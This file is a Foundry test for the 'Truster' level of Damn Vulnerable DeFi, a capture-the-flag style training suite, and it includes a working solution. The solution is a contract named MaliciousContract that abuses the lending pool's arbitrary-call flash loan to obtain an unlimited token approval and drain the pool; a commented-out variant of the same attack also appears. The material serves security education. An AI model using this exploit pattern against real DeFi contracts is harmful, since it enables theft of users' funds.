// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // This Nonce is 0
        // TrusterLenderPool(pool).flashLoan(
        //     0,
        //     address(pool),
        //     address(token),
        //     abi.encodeWithSignature("approve(address,uint256)", player, type(uint256).max)
        // );

        // token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
        // token.approve(recovery, token.balanceOf(player));
        
        // token.transfer(recovery, token.balanceOf(player));

        MaliciousContract maliciousContract = new MaliciousContract();
        maliciousContract.attack(address(pool), address(token), recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract MaliciousContract{
    address pool;
    DamnValuableToken token;
    address recovery;

    function attack(address _pool, address _token, address _recovery) external {
        pool = _pool;
        token = DamnValuableToken(_token);
        recovery = _recovery;

        TrusterLenderPool(pool).flashLoan(
            0,
            pool,
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
        token.transferFrom(pool, address(this), token.balanceOf(pool));

        token.transfer(recovery, token.balanceOf(address(this)));

    }
    
}